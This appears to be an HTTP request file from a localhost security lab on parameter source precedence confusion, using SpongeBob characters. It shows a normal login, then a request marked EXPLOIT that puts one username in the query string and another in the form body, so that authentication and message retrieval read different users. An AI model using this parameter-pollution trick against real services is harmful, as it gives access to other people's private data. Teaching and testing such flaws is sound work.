@base = http://localhost:8000/confusion/source-precedence/example8

### SpongeBob authenticates and retrieves his messages using POST body
POST {{base}}
Content-Type: application/x-www-form-urlencoded

user=spongebob&password=bikinibottom

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

###

### EXPLOIT: Plankton reverses the attack with merged auth and form-only retrieval
### SpongeBob username in query (merged for auth), Squidward in form (used for retrieval)
POST {{base}}?user=spongebob
Content-Type: application/x-www-form-urlencoded

user=squidward&password=bikinibottom

# The attack works in reverse! Authentication merges sources (reading SpongeBob from query),
# while message retrieval uses form-only (reading Squidward). Same vulnerability, opposite flow.
